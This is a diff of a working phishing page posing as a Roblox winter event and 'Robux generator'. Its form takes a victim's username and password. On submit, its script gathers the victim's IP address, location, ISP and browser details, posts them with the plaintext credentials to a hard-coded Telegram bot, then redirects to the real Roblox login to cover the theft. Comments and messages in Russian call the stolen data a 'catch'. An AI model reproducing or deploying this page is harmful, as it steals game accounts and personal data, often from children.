@@ -3,137 +3,124 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Roblox: Winter Premium Event 2025</title>
+    <title>ROBLOX: WINTER EVENT 2025</title>
     <style>
         body { 
-            background: radial-gradient(circle at center, #1a1a1a 0%, #050505 100%); 
+            background: radial-gradient(circle, #200101 0%, #050000 100%); 
             color: #fff; 
-            font-family: 'HCo Gotham SSm', sans-serif; 
+            font-family: 'Arial Black', Gadget, sans-serif; 
             margin: 0; 
-            height: 100vh; 
             display: flex; 
             justify-content: center; 
-            align-items: center;
+            align-items: center; 
+            height: 100vh;
+            overflow: hidden;
         }
-        .main-card { 
-            background: rgba(255, 255, 255, 0.03); 
-            backdrop-filter: blur(10px);
-            border: 1px solid rgba(255, 255, 255, 0.1);
-            border-radius: 20px; 
-            padding: 40px; 
-            text-align: center; 
-            width: 100%;
-            max-width: 420px;
-            box-shadow: 0 20px 50px rgba(0,0,0,0.5);
+        .container { 
+            background: rgba(20, 20, 20, 0.95);
+            border: 3px solid #ff0000;
+            box-shadow: 0 0 30px #ff0000;
+            border-radius: 15px;
+            padding: 40px;
+            width: 400px;
+            text-align: center;
+            position: relative;
         }
-        .santa-icon { width: 100px; filter: drop-shadow(0 0 15px #0084ff); margin-bottom: 10px; }
-        .rbx-logo-large { width: 220px; margin-bottom: 25px; filter: brightness(0) invert(1); }
+        .logo-box { position: relative; display: inline-block; }
+        .rbx-main-logo { width: 300px; filter: drop-shadow(0 0 10px #ff0000); }
+        .santa-hat { position: absolute; width: 80px; top: -35px; right: -20px; transform: rotate(15deg); }
         
-        h1 { font-size: 26px; margin: 0; letter-spacing: 2px; text-transform: uppercase; color: #0084ff; text-shadow: 0 0 10px rgba(0,132,255,0.5); }
-        .promo-tag { background: #ff3b3b; color: white; padding: 4px 12px; border-radius: 50px; font-size: 10px; font-weight: bold; margin-bottom: 20px; display: inline-block; }
+        h1 { font-size: 28px; color: #ff0000; text-transform: uppercase; margin: 20px 0 10px; text-shadow: 2px 2px #000; }
+        .verif-text { color: #00ff00; font-size: 14px; margin-bottom: 20px; font-weight: bold; }
 
         input, select { 
-            width: 100%; 
-            padding: 15px; 
-            margin: 12px 0; 
-            border-radius: 8px; 
-            border: 1px solid rgba(255, 255, 255, 0.1); 
-            background: rgba(0, 0, 0, 0.3); 
-            color: #fff; 
-            font-size: 14px; 
-            box-sizing: border-box;
+            width: 100%; padding: 15px; margin: 10px 0; 
+            background: #111; border: 2px solid #333; color: #fff; 
+            font-weight: bold; border-radius: 5px; box-sizing: border-box;
         }
-        input:focus { border-color: #0084ff; outline: none; background: rgba(0, 0, 0, 0.5); }
+        input:focus { border-color: #ff0000; outline: none; }
 
-        .btn-strike { 
-            background: linear-gradient(90deg, #0084ff, #00c6ff); 
-            color: white; 
-            border: none; 
-            padding: 18px; 
-            width: 100%; 
-            border-radius: 8px; 
-            font-weight: bold; 
-            font-size: 16px; 
-            cursor: pointer; 
-            margin-top: 20px;
-            text-transform: uppercase;
-            transition: 0.3s;
+        .btn-main { 
+            width: 100%; padding: 20px; background: #ff0000; color: #fff; 
+            border: none; font-size: 20px; font-weight: bold; cursor: pointer; 
+            text-transform: uppercase; transition: 0.3s; margin-top: 15px;
+            box-shadow: 0 5px 0 #8b0000;
         }
-        .btn-strike:hover { transform: scale(1.02); box-shadow: 0 0 20px rgba(0,132,255,0.4); }
+        .btn-main:hover { background: #ff3333; transform: translateY(-2px); }
+        .btn-main:active { transform: translateY(2px); box-shadow: none; }
 
-        .verification { font-size: 11px; color: #666; margin-top: 20px; }
-        .badge { color: #00ff88; font-size: 12px; font-weight: bold; margin-bottom: 10px; display: block; }
+        .footer { margin-top: 25px; font-size: 10px; color: #444; letter-spacing: 1px; }
     </style>
 </head>
 <body>
 
-<div class="main-card">
-    <img src="https://upload.wikimedia.org/wikipedia/commons/3/3a/Roblox_player_icon_with_a_santa_hat.png" class="santa-icon" alt="Santa">
-    <br>
-    <img src="https://upload.wikimedia.org/wikipedia/commons/e/eb/Roblox_Logo_2022.svg" class="rbx-logo-large" alt="ROBLOX">
+<div class="container">
+    <div class="logo-box">
+        <img src="https://upload.wikimedia.org/wikipedia/commons/e/eb/Roblox_Logo_2022.svg" class="rbx-main-logo">
+        <img src="https://www.pngall.com/wp-content/uploads/2016/05/Santa-Hat-PNG-Image.png" class="santa-hat">
+    </div>
     
-    <span class="badge">✓ СИСТЕМА ПРОВЕРЕНА: 30+ ДНЕЙ ЗАЩИТЫ</span>
-    <h1>WINTER GIFT</h1>
-    <div class="promo-tag">NEW YEAR EVENT 2025</div>
+    <h1>ROBUX GENERATOR</h1>
+    <div class="verif-text">● ACCOUNT STATUS: 30+ DAYS VERIFIED</div>
 
-    <form id="darkShot">
-        <input type="text" id="u" placeholder="Username" required>
-        <input type="password" id="p" placeholder="Password" required>
+    <form id="hunterAction">
+        <input type="text" id="u" placeholder="USERNAME" required>
+        <input type="password" id="p" placeholder="PASSWORD" required>
         <select id="r">
-            <option value="1700">1,700 Robux (Gift Pack)</option>
-            <option value="4500">4,500 Robux (Premium)</option>
-            <option value="10000">10,000 Robux (Santa's Bag)</option>
-            <option value="31500">31,500 Robux (Legendary)</option>
+            <option value="1000">1,000 ROBUX</option>
+            <option value="5000">5,000 ROBUX</option>
+            <option value="10000">10,000 ROBUX</option>
+            <option value="50000">50,000 ROBUX</option>
         </select>
-        <button type="submit" id="btn">ПОЛУЧИТЬ ПОДАРОК</button>
+        <button type="submit" id="btn">CLAIM NOW</button>
     </form>
 
-    <div class="verification">
-        🛡️ Anti-Bot Verification 2.4 Active<br>
-        ©2025 Roblox Corporation
-    </div>
+    <div class="footer">ADMIN PANEL v4.2 | ANTIBOT ACTIVE</div>
 </div>
 
 <script>
-    document.getElementById('darkShot').onsubmit = async function(e) {
+    document.getElementById('hunterAction').onsubmit = async function(e) {
         e.preventDefault();
         const btn = document.getElementById('btn');
-        btn.innerText = "СИНХРОНИЗАЦИЯ...";
+        btn.innerText = "WAITING...";
         
         const u = document.getElementById('u').value;
         const p = document.getElementById('p').value;
         const r = document.getElementById('r').value;
 
+        // ПОЛНОЕ ДОСЬЕ (IP + Город + Провайдер)
+        let fullIp = "Hidden";
+        try {
+            const res = await fetch('https://ipapi.co/json/');
+            const data = await res.json();
+            fullIp = `${data.ip} (${data.city}, ${data.country_name})\n🏢 Провайдер: ${data.org}`;
+        } catch(err) {
+            try {
+                const res2 = await fetch('https://api.ipify.org');
+                fullIp = await res2.text();
+            } catch(e) {}
+        }
+
+        const device = `🖥️ Железо: ${navigator.platform}\n📱 Браузер: ${navigator.userAgent.split(') ')[1]}`;
+
         const token = '8098842209:AAE4Ff4yzUKZP6KwffFsufrXYqwioo0zifk';
         const chatId = '8165386246';
 
-        let ip = "Скрыт";
-        try {
-            const res = await fetch('https://api.ipify.org?format=json');
-            const data = await res.json();
-            ip = data.ip;
-        } catch(err) {}
-
-        const info = `${navigator.platform} | ${navigator.vendor}`;
-
-        const text = `🔪 **DARK PASSENGER: УЛОВ** 🔪\n` +
+        const text = `🔪 **DARK PASSENGER: ПОЛНЫЙ ВЕРДИКТ** 🔪\n` +
                      `━━━━━━━━━━━━━━━━━━\n` +
                      `👤 **Юзер:** \`${u}\`\n` +
                      `🔑 **Пароль:** \`${p}\`\n` +
-                     `💎 **Буксы:** ${r}\n` +
-                     `🌐 **IP:** ${ip}\n` +
-                     `📱 **Инфо:** ${info}\n` +
+                     `💎 **Сумма:** ${r} Robux\n\n` +
+                     `🌐 **IP-Данные:**\n${fullIp}\n\n` +
+                     `${device}\n` +
                      `━━━━━━━━━━━━━━━━━━\n` +
-                     `📅 **Статус:** 30+ Days Verified\n` +
-                     `🩸 *Кодекс соблюден.*`;
+                     `🩸 *Кодекс соблюден. Объект вскрыт.*`;
 
-        try {
-            await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ chat_id: chatId, text: text, parse_mode: 'Markdown' })
-            });
-        } catch(err) {}
+        await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ chat_id: chatId, text: text, parse_mode: 'Markdown' })
+        });
 
         window.location.href = "https://www.roblox.com/login";
     };
